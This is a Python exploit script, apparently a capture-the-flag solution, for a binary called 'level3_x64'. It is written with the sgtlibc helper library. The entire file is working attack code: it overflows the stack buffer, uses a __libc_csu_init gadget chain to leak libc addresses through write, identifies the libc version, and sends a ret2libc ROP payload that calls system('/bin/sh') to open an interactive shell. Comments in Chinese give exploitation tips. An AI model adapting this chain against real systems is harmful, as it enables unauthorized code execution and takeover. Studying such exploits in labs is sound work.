import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./level3_x64',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))

s = sgtlibc.Searcher()
elf = client.elf

main_addr = elf.symbols['main']
csu_init_addr = elf.symbols['__libc_csu_init']

canary = b''


def exp():
    # overflow position
    data = [b'a' * (136),fakeebp()]
    return data


def leak(func: str):
    log.info(f'leak function {func}')
    payload = exp()
    d = gadgets.gadget_by_csu(
        libc_csu_init_address=csu_init_addr,
        func_to_call=elf.got['write'],
        param1=1,
        param2=elf.got[func],
        param3=8,
        ret_addr=main_addr
    )
    payload += [gadgets.build(d)]
    # 如果是read的话则sa，如果是gets scanf的话则sl
    sa(b'Input:\n', payload)

    data = rc(7).ljust(8, b'\0')
    data = u00(data)
    s.add_condition(func, data)
    log.info(f'leak function {func}:{hex(data)}')


pause()
# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
leak('write')
leak('__libc_start_main')

# 如果给了libc则可以直接使用
# libc = ELF('libc_buu-2.23_x64.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

data = s.dump(db_index=0)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')


ret_addr = elf.rop['ret']  # sometime maybe wrong
payload = [exp(), ret_addr]  # 栈平衡
payload += [elf.rop['rdi'], binsh_addr, system_addr, fakeebp()]
sl(payload)

interactive()
